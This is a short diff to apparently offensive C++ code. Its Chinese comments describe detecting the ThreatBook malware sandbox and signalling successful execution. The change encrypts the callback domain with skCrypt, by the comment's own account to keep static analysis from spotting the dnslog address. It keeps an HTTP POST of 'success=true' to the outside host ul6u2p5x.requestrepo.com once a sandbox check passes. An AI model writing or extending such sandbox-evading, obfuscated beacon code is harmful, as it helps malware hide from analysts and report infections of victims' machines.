@@ -1,5 +1,9 @@
 #include "header.h"
 
+//搭配skCrypter加密
+std::string charToString(const char* str) {
+    return std::string(str);
+}
 //检测微步释放路径
 std::string workingdir()
 {
@@ -175,8 +179,10 @@ bool check_edge() {
 int main() {
     //用于提示已经成功执行
     if (check_edge()) {
-        auto url = "ul6u2p5x.requestrepo.com";
-        httplib::Client cli(url);
+        //dnslog地址 可自行更换或者不使用
+        //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
+        auto url = skCrypt("ul6u2p5x.requestrepo.com");
+        httplib::Client cli(charToString(url));
         httplib::Params p;
         p.emplace("success", "true");
         auto res = cli.Post("/", p);
